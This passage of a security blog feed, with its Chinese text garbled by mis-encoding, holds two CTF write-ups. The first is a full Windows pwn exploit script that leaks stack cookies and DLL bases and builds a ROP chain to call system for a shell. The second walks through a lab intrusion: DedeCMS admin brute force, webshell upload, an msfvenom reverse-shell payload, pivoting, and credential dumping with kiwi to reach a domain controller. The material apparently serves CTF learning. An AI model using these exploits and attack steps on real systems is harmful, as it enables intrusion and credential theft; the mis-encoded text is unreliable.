æ§åˆ¶å¾ªç¯<br>ç¬¬äº”æ¬¡èµ° system getshell</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token comment">#1----leak StackCookie</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>StackCookie<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'StackCookie'</span><span class="token punctuation">,</span>StackCookie<span class="token punctuation">)</span><span class="token comment">#-----leak bbase</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x18</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>btext<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x2f4</span>lg<span class="token punctuation">(</span><span class="token string">'btext'</span><span class="token punctuation">,</span>btext<span class="token punctuation">)</span><span class="token comment">#------ret main</span>main<span class="token operator">=</span>btextpayload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#2------leak StackCookie2</span>payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>StackCookie2<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'StackCookie2'</span><span class="token punctuation">,</span>StackCookie2<span class="token punctuation">)</span><span class="token comment">#-----leak ntdll</span>payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x180</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>ntdll<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x69271</span>lg<span class="token punctuation">(</span><span class="token string">'ntdll'</span><span class="token punctuation">,</span>ntdll<span class="token punctuation">)</span>rcx<span class="token operator">=</span><span class="token number">0x000000018009217b</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdllrdx<span class="token operator">=</span><span class="token number">0x0000000180057652</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdllr8<span class="token operator">=</span><span class="token number">0x000000018002010b</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdllrbx<span class="token operator">=</span><span class="token number">0x00000001800011a4</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdll<span class="token comment">#------ret main</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#3------leak StackCookie3</span>payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>StackCookie3<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'StackCookie3'</span><span class="token punctuation">,</span>StackCookie3<span class="token punctuation">)</span><span class="token comment">#-------paddings</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span><span class="token string">'X1NRI'</span><span class="token punctuation">)</span><span class="token comment">#-------leak __security_cookie</span>call_puts<span class="token operator">=</span><span class="token number">0x00000001400010A6</span><span class="token operator">-</span><span class="token number">0x0000000140001000</span><span class="token operator">+</span>btext__security_cookie_addr<span class="token operator">=</span><span class="token number">0x0000000140003008</span><span class="token operator">-</span><span class="token number">0x0000000140001000</span><span class="token operator">+</span>btextpayload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'B'</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__security_cookie_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>call_puts<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>__security_cookie<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'__security_cookie'</span><span class="token punctuation">,</span>__security_cookie<span class="token punctuation">)</span><span class="token comment">#-------leak ucrtbase</span>puts_iat<span class="token operator">=</span><span class="token number">0x0000000140002180</span><span class="token operator">-</span><span class="token number">0x0000000140001000</span><span class="token operator">+</span>btextold_rsp<span class="token operator">=</span>StackCookie3<span class="token operator">^</span>__security_cookielg<span class="token punctuation">(</span><span class="token string">'old_rsp'</span><span class="token punctuation">,</span>old_rsp<span class="token punctuation">)</span>new_rsp<span class="token operator">=</span>old_rsp<span class="token operator">+</span><span class="token number">0x160</span>StackCookie<span class="token operator">=</span>new_rsp<span class="token operator">^</span>__security_cookiepayload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'B'</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_iat<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>call_puts<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ucrtbase<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7F760</span>lg<span class="token punctuation">(</span><span class="token string">'ucrtbase'</span><span class="token punctuation">,</span>ucrtbase<span class="token punctuation">)</span><span class="token comment">#-------system</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>new_rsp<span class="token operator">=</span>old_rsp<span class="token operator">+</span><span class="token number">0x2c0</span>StackCookie<span class="token operator">=</span>new_rsp<span class="token operator">^</span>__security_cookiesystem<span class="token operator">=</span><span class="token number">0x00000001800ABBA0</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ucrtbasecmd<span class="token operator">=</span><span class="token number">0x00000001800CC9F0</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ucrtbasepayload<span class="token operator">=</span><span class="token string">b'C'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'C'</span><span class="token operator">*</span><span class="token number">0x10</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿åŸæ¯é“äººä¸‰é¡¹2020 ä¼ä¸šç¯å¢ƒæ¸—é€</title>
      <link href="/2024/07/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B92020%20%E4%BC%81%E4%B8%9A%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/"/>
      <url>/2024/07/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B92020%20%E4%BC%81%E4%B8%9A%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>åˆ›å»ºä¸¤ä¸ªç½‘å¡åˆ†åˆ«ä¸º vmnet2 192.168.50.0ï¼Œvmnet3 192.168.60.0</p><ul><li>WEBï¼švmnet2ä»…ä¸»æœº</li><li>PCï¼švmnet2ä»…ä¸»æœºã€vmnet3ä»…ä¸»æœº</li><li>ADï¼švmnet3ä»…ä¸»æœº</li></ul><p><img src="/Red_FILE/995d4217d91ce773dd06680bdeb497f2_MD5.jpeg"></p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p><img src="/Red_FILE/4cdc5b12899f9d6d0600853d9b621f35_MD5.jpeg"></p><p>å¸¸è§„æ‰«ç«¯å£+æ‰«ç›®å½•<br><img src="/Red_FILE/2c4acf7c4476397171e33b0fc831e837_MD5.jpeg"></p><p>æ‰“å¼€ç«¯å£ï¼š</p><ul><li>22ï¼šssh</li><li>25ï¼šsmtp</li><li>110ï¼špop3</li><li>80ï¼šhttp</li></ul><p>ä¸­é—´ä»¶æ˜¯apache 2.4.6ï¼Œcentosç³»ç»Ÿï¼Œç½‘ç«™ç”±php5.4.16ç¼–å†™ï¼Œcmsæ˜¯dedecms</p><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>æ‰«å‡ºäº†å‡ ä¸ªæœ‰æ„æ€çš„ç›®å½•</p><p>åœ¨&#x2F;sql&#x2F;index.phpä¸‹å‘ç°äº†å¥‡æ€ªçš„è´¦å¯†ï¼Œåƒæ˜¯æ•°æ®åº“çš„å¯†ç <br><img src="/Red_FILE/f636a624f1dfed0fa186be1efc0437f6_MD5.jpeg"></p><p>&#x2F;memberæ˜¯ä¸ªç©ºé¡µé¢<br><img src="/Red_FILE/eba0038e6eaf477c6e0764a5e8dd6766_MD5.jpeg"></p><p>æ²¡æœ‰å¤ªå¤šä¸œè¥¿ï¼Œè¯•ç€ä»dedecmsåˆ‡å…¥ï¼Œåœ¨&#x2F;dedeå­˜åœ¨åå°ç™»é™†ç•Œé¢ã€‚è¯•ç€å»bpçˆ†ç ´ä¸€ä¸‹å¼±å£ä»¤ï¼Œå¾—åˆ°è´¦å¯†<code>admin:1q2w3e4r</code>ï¼Œç™»å½•ç®¡ç†åå°<br><img src="/Red_FILE/ae19654fd4c2e79af9f70e7a8481f4aa_MD5.jpeg"><br><img src="/Red_FILE/620171fd16bcd32bb153b22e9b564836_MD5.jpeg"><br>å¾—åˆ°flag1</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag1&#123;5d41402abc4b2a76b9719d11017c592&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨åå°å‘ç°ä¸€ä¸ªsqlå‘½ä»¤æ‰§è¡Œç•Œé¢ï¼ŒæŸ¥è¯¢è¡¨æ•°æ®ï¼Œå¾—åˆ°äº†ä¸€äº›è´¦å¯†ï¼Œä½†å¹¶ä¸æ˜¯webæœåŠ¡å™¨çš„<br><img src="/Red_FILE/d040f5283f0bef8a5b10e3b53141fc73_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">è¿è¡ŒSQLï¼šSELECT * FROM topsec_adminï¼Œå…±æœ‰2æ¡è®°å½•ï¼Œæœ€å¤§è¿”å›100æ¡ï¼è®°å½•ï¼š1idï¼š1usertypeï¼š10useridï¼šadminpwdï¼š7cd6ef195a0f7622a9c5unameï¼šadmintnameï¼šemailï¼štypeidï¼šlogintimeï¼š1719735645loginipï¼š192.168.50.1è®°å½•ï¼š2idï¼š2usertypeï¼š10useridï¼šadministratorpwdï¼štopsec.123unameï¼šadministratortnameï¼šemailï¼štypeidï¼šlogintimeï¼š0loginipï¼š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬è¿™ä¸ªè´¦æˆ·åœ¨ topsec_member é‡Œ<br><img src="/Red_FILE/1f221b1e383c5a5d89394eba72146eba_MD5.jpeg"></p><p>åŒæ—¶ä¹Ÿå¾—åˆ°äº†flag2</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag2&#123;912ec803b2ce49e4a541068d495ab570&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Red_FILE/2f055860a8e352516ab1f9216e0f3640_MD5.jpeg"></p><p>è¿™ä¸ªsqlæŸ¥è¯¢ä»…æ”¯æŒç®€å•çš„æŸ¥è¯¢æ“ä½œï¼Œä¸èƒ½å†™é©¬</p><p>ä½†æ˜¯æˆ‘å‘ç°äº†ä¸€ä¸ªä¸Šä¼ ç‚¹<br><img src="/Red_FILE/b514d28372a3a76e922adb62884e990d_MD5.jpeg"><br>ä¸Šä¼ phpå¤±è´¥<br><img src="/Red_FILE/81ffb1713f00291da163e50e73f65fd4_MD5.jpeg"><br>æŠ“åŒ…æ”¹MIMEä¸ºimageä¹Ÿä¸è¡Œ<br><img src="/Red_FILE/3df3da93fe953b2b202d464a43f7d444_MD5.jpeg"></p><p>æ€ä¹ˆåŠå‘¢ï¼Œæˆ‘ç•™æ„åˆ°ä¸€å¥è¯<br><img src="/Red_FILE/7fc1c1cf985c02342a29cf3dd18e9a29_MD5.jpeg"></p><p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ä¸Šä¼ æ–‡ä»¶ç±»å‹çš„ç³»ç»Ÿå‚æ•°ï¼Œé‚£å°±ç•…é€šæ— é˜»äº†ï¼Œçœ‹æ¥æ˜¯ç™½åå•è¿‡æ»¤ï¼Œæ›´æ”¹è®¾ç½®åé‡æ–°ä¸Šä¼ <br><img src="/Red_FILE/cea240425f031f024e6370d46bc69559_MD5.jpeg"></p><p>æ²¡æ€è½¯ï¼Œä¸Šä¼ ä¸ªä¸€å¥è¯å°±å¤Ÿäº†<br><img src="/Red_FILE/b8a2949285ae1a6f819d903f4b1a133b_MD5.jpeg"><br>ç¡®å®šæœ¨é©¬ä½ç½®åè¿æ¥ï¼Œæ‹¿ä¸‹webæœåŠ¡å™¨shellï¼<br><img src="/Red_FILE/27b9c04719dbef6f27b335e311d25d24_MD5.jpeg"><br><img src="/Red_FILE/23f49a70ee6f8ad2c4508a3e81426e34_MD5.jpeg"><br>ä¸è¿‡æ²¡æœåˆ°flag<br><img src="/Red_FILE/c1762ba8e501d17fb6a91fcce952828d_MD5.jpeg"></p><h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><p><img src="/Red_FILE/1b48043cb3d8ef96e3484cacc3a8824a_MD5.jpeg"></p><p>å…ˆä¸Šä¸ªæœ¨é©¬ï¼Œåå¼¹shellåˆ°msfä¸Š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">-p</span> linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.50.133 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-b</span> <span class="token string">'\x00'</span> <span class="token parameter variable">-o</span> ma.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Red_FILE/bfc892c11bc12908eac49f31d0f788e3_MD5.jpeg"></p><p>webä¸»æœºæ‰€åœ¨ç½‘æ®µä¸º 192.168.50.0&#x2F;24<br><img src="/Red_FILE/23c3b191bf924202e5261465f4a6e058_MD5.jpeg"></p><p>æ·»åŠ ä¸€æ®µä¸»æœºè·¯ç”±ï¼Œä»¥è½¬å‘æˆ‘ä»¬çš„æ”»å‡»æœºæµé‡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.50.0/24run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨ 192.168.50.130 æœ‰ä¸€ä¸ªwindowsä¸»æœºå­˜æ´»<br><img src="/Red_FILE/0d32c4e3367cfbfb847eeedf9374cdf0_MD5.jpeg"></p><p>é€Ÿæ‰«ä¸‹ç«¯å£<br><img src="/Red_FILE/835bbdc21a0c3e4f8612b11970437223_MD5.jpeg"></p><p>æ°¸æ’ä¹‹è“ä¸å¥½åˆ©ç”¨x86æœºå™¨ï¼Œè¿™æ—¶æˆ‘æƒ³åˆ°äº†å‰é¢è·å–åˆ°çš„å¯†ç ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">è¿è¡ŒSQLï¼šSELECT * FROM topsec_adminï¼Œå…±æœ‰2æ¡è®°å½•ï¼Œæœ€å¤§è¿”å›100æ¡ï¼è®°å½•ï¼š1idï¼š1usertypeï¼š10useridï¼šadminpwdï¼š7cd6ef195a0f7622a9c5unameï¼šadmintnameï¼šemailï¼štypeidï¼šlogintimeï¼š1719735645loginipï¼š192.168.50.1è®°å½•ï¼š2idï¼š2usertypeï¼š10useridï¼šadministratorpwdï¼štopsec.123unameï¼šadministratortnameï¼šemailï¼štypeidï¼šlogintimeï¼š0loginipï¼š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è½¬å‘ç›®æ ‡æœºçš„ 3389 ç«¯å£åˆ°æœ¬åœ°ï¼Œè¿œç¨‹æ¡Œé¢ç™»å½•<br><img src="/Red_FILE/54739d497c7799d281f891f5a4f0456d_MD5.jpeg"></p><p>è´¦å¯†<code>administrator:topsec.123</code>æˆåŠŸç™»å½•åˆ° PCï¼Œnice<br><img src="/Red_FILE/ff8a7f4271176252b21488bc253e87f8_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag4&#123;238fb735876083b832229d279b995062&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ‹¿ä¸‹åŸŸæ§"><a href="#æ‹¿ä¸‹åŸŸæ§" class="headerlink" title="æ‹¿ä¸‹åŸŸæ§"></a>æ‹¿ä¸‹åŸŸæ§</h1><p><img src="/Red_FILE/d6ff1b629277f048fd7c4e1b75172afb_MD5.jpeg"><br>å­˜åœ¨test.comåŸŸï¼Œä¸éš¾å‘ç°è¯¥ä¸»æœºè¿˜å­˜åœ¨ä¸€ä¸ª 192.168.60.0 ç½‘æ®µï¼ŒåŸŸæ§å¤šåŠå°±åœ¨è¯¥ç½‘æ®µ</p><p>å…ˆä¸Šä¸ªé©¬æ‹¿åˆ°meterpreter shellï¼›æ‰«ä¸‹Cæ®µï¼ŒåŸŸæ§ä½äº 192.168.60.130<br><img src="/Red_FILE/3d087c91b4a770e85520b59d840b765a_MD5.jpeg"></p><p>æˆ‘ä»¬æ˜¯ administartorï¼Œ getsystem æ‹¿åˆ° SYSTEM æƒé™ï¼Œå†å°è¯• kiwi æŠ“å–æ˜æ–‡å¯†ç <br><img src="/Red_FILE/4958f72ef59e9aaf23e168569b2d1f1e_MD5.jpeg"><br>æŠ“å–åˆ°ä¸€ä¸ªè´¦æˆ· <code>Administrator:TopSec_2017</code></p><p>é€šè¿‡PCä½œè·³æ¿ï¼Œç™»å½•åŸŸæ§æ‹¿åˆ°flag5<br><img src="/Red_FILE/7d99722a190faa8e4e36e6bc7f56d46d_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag5&#123;6aa16f9b07f2d00b16b94aa797488b38&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æ‹¿ä¸‹äº†æ‰€æœ‰ä¸»æœºæƒé™</p><h1 id="åæ€"><a href="#åæ€" class="headerlink" 